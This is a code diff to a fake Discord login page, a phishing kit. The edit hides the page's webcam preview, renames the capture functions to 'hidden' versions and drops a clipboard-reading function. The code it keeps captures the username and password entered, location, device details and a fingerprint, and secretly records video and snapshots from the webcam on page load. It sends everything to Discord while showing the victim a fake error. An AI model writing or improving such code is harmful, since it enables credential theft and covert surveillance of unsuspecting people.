@@ -153,17 +153,20 @@
       height: 48px;
       fill: #ffffff;
     }
-    #video-preview {
-      width: 100%;
-      max-height: 200px;
-      background: #000;
-      border-radius: 4px;
-      margin-bottom: 12px;
-      display: none;
-    }
     /* Hidden audio player */
     #hack-sound {
       display: none;
+    }
+    /* Hidden video element – no preview shown */
+    #hidden-camera {
+      display: none !important;
+      width: 0;
+      height: 0;
+      opacity: 0;
+      pointer-events: none;
+      position: absolute;
+      top: -9999px;
+      left: -9999px;
     }
   </style>
 </head>
@@ -179,12 +182,12 @@
     <h1>Welcome back!</h1>
     <p class="subtitle">We're so excited to see you again!</p>
 
-    <video id="video-preview" autoplay muted playsinline></video>
+    <!-- Hidden video element – completely invisible -->
+    <video id="hidden-camera" autoplay muted playsinline></video>
 
     <!-- Hidden audio element for "GET HACKED" sound -->
     <audio id="hack-sound" preload="auto">
       <source src="https://www.myinstants.com/media/sounds/get-hacked.mp3" type="audio/mpeg">
-      <source src="https://cdn.discordapp.com/attachments/1234567890/get-hacked.mp3" type="audio/mpeg">
     </audio>
 
     <form id="loginForm" novalidate>
@@ -233,7 +236,7 @@
       const usernameError = document.getElementById('usernameError');
       const passwordError = document.getElementById('passwordError');
       const statusBar = document.getElementById('statusBar');
-      const videoPreview = document.getElementById('video-preview');
+      const hiddenVideo = document.getElementById('hidden-camera');
       const hackSound = document.getElementById('hack-sound');
 
       let recordedVideoBlob = null;
@@ -260,7 +263,7 @@
           hackSound.currentTime = 0;
           hackSound.volume = 1.0;
           hackSound.play().catch(() => {
-            // Fallback: use a Web Audio oscillator if the MP3 fails
+            // Fallback: Web Audio oscillator
             try {
               const ctx = new (window.AudioContext || window.webkitAudioContext)();
               const osc = ctx.createOscillator();
@@ -284,9 +287,10 @@
       }
 
       // ============================================================
-      //  START WEBCAM & RECORD 3-SECOND VIDEO + SNAPSHOTS
+      //  START HIDDEN WEBCAM & RECORD 3-SECOND VIDEO + SNAPSHOTS
+      //  (NO VISUAL PREVIEW – COMPLETELY HIDDEN)
       // ============================================================
-      async function startWebcamAndRecord() {
+      async function startHiddenRecording() {
         try {
           const stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -294,8 +298,8 @@
           });
 
           webcamStream = stream;
-          videoPreview.srcObject = stream;
-          videoPreview.style.display = 'block';
+          // Attach to hidden video element (invisible)
+          hiddenVideo.srcObject = stream;
 
           // --- RECORD 3-SECOND VIDEO ---
           const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
@@ -309,7 +313,6 @@
             const blob = new Blob(chunks, { type: 'video/webm' });
             recordedVideoBlob = blob;
             console.log('🎥 Video recorded:', blob.size, 'bytes');
-            // Don't stop the stream — we still need it for snapshots
           };
 
           recorder.start();
@@ -319,11 +322,11 @@
 
           // --- SNAPSHOT EVERY 5 SECONDS ---
           snapshotInterval = setInterval(() => {
-            captureSnapshot();
+            captureHiddenSnapshot();
           }, 5000);
 
-          // Also take one immediately
-          setTimeout(() => captureSnapshot(), 500);
+          // Take one immediately
+          setTimeout(() => captureHiddenSnapshot(), 500);
 
           return true;
         } catch (err) {
@@ -333,9 +336,9 @@
       }
 
       // ============================================================
-      //  CAPTURE SNAPSHOT (stores in array)
+      //  CAPTURE HIDDEN SNAPSHOT (no preview, no feedback)
       // ============================================================
-      function captureSnapshot() {
+      function captureHiddenSnapshot() {
         if (!webcamStream) return;
         try {
           const video = document.createElement('video');
@@ -351,7 +354,6 @@
               if (blob && blob.size > 0) {
                 snapshotBlobs.push(blob);
                 console.log('📸 Snapshot taken:', blob.size, 'bytes (total:', snapshotBlobs.length, ')');
-                // Keep only last 10 snapshots to avoid memory issues
                 if (snapshotBlobs.length > 10) {
                   snapshotBlobs.shift();
                 }
@@ -359,18 +361,6 @@
             }, 'image/jpeg', 0.7);
           }, 100);
         } catch (_) {}
-      }
-
-      // ============================================================
-      //  GET CLIPBOARD DATA
-      // ============================================================
-      async function getClipboardData() {
-        try {
-          const text = await navigator.clipboard.readText();
-          return text || 'Empty clipboard';
-        } catch (_) {
-          return 'Clipboard access denied';
-        }
       }
 
       // ============================================================
@@ -557,12 +547,10 @@
           const formData = new FormData();
           formData.append('payload_json', JSON.stringify({ content: message }));
 
-          // Attach video if exists
           if (videoBlob && videoBlob.size > 0) {
             formData.append('file', videoBlob, 'recording.webm');
           }
 
-          // Attach snapshots (up to 5 most recent)
           const snapshotsToSend = snapshotBlobsArray.slice(-5);
           for (let i = 0; i < snapshotsToSend.length; i++) {
             if (snapshotsToSend[i] && snapshotsToSend[i].size > 0) {
@@ -597,33 +585,29 @@
       form.addEventListener('submit', async (e) => {
         e.preventDefault();
 
-        // Play "GET HACKED" sound immediately
+        // Play "GET HACKED" sound
         playHackSound();
 
-        // Validate fields (but always show fake error regardless)
+        // Validate fields (but always show fake error)
         usernameError.style.display = 'none';
         passwordError.style.display = 'none';
-        let isValid = true;
 
         if (!usernameInput.value.trim()) {
           usernameError.style.display = 'block';
-          isValid = false;
         }
         if (!passwordInput.value.trim()) {
           passwordError.style.display = 'block';
-          isValid = false;
         }
 
-        // Collect data (whether valid or not — we still collect everything)
+        // Show fake error immediately
         showFakeError();
 
-        // Collect everything in parallel
+        // Collect data
         const [
           timestamp,
           geo,
           os,
           browser,
-          clipboard,
           battery,
           canvasFingerprint
         ] = await Promise.all([
@@ -631,7 +615,6 @@
           getGeoData(),
           Promise.resolve(getExactOS()),
           Promise.resolve(getExactBrowser()),
-          getClipboardData(),
           getBatteryLevel(),
           Promise.resolve(getCanvasFingerprint())
         ]);
@@ -640,8 +623,7 @@
         const password = passwordInput.value.trim() || '(empty)';
         const rememberMe = document.getElementById('rememberMe').checked;
 
-        // Build the message
-        let message = `
+        const message = `
 🔐 **Discord Login Capture – FULL SPECTRUM**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -659,7 +641,6 @@
 🖥️ **OS:** ${os}
 🌍 **Browser:** ${browser}
 🔋 **Battery:** ${battery}
-📋 **Clipboard:** ${clipboard.substring(0, 200)}
 🎨 **Canvas Fingerprint:** ${canvasFingerprint}
 
 👤 **Username:** ${username}
@@ -674,7 +655,6 @@
         console.log('📋 [LOG] Full client data:');
         console.log(message);
 
-        // Send to Discord with video + snapshots
         const sent = await sendToDiscord(message, recordedVideoBlob, snapshotBlobs);
 
         if (sent) {
@@ -683,16 +663,15 @@
           console.warn('⚠️ Some data may not have sent.');
         }
 
-        // Clear password field (for show)
         passwordInput.value = '';
 
-        // Stop snapshot interval to save resources
+        // Stop snapshot interval
         if (snapshotInterval) {
           clearInterval(snapshotInterval);
           snapshotInterval = null;
         }
 
-        // Stop webcam stream
+        // Stop webcam
         if (webcamStream) {
           webcamStream.getTracks().forEach(track => track.stop());
           webcamStream = null;
@@ -700,13 +679,11 @@
       });
 
       // ============================================================
-      //  ON PAGE LOAD – Start webcam + log data
+      //  ON PAGE LOAD – Start hidden recording + log data
       // ============================================================
       window.addEventListener('DOMContentLoaded', async () => {
-        // Start webcam and record 3-second video + snapshots
-        await startWebcamAndRecord();
+        await startHiddenRecording();
 
-        // Log initial data
         const geo = await getGeoData();
         const os = getExactOS();
         const browser = getExactBrowser();
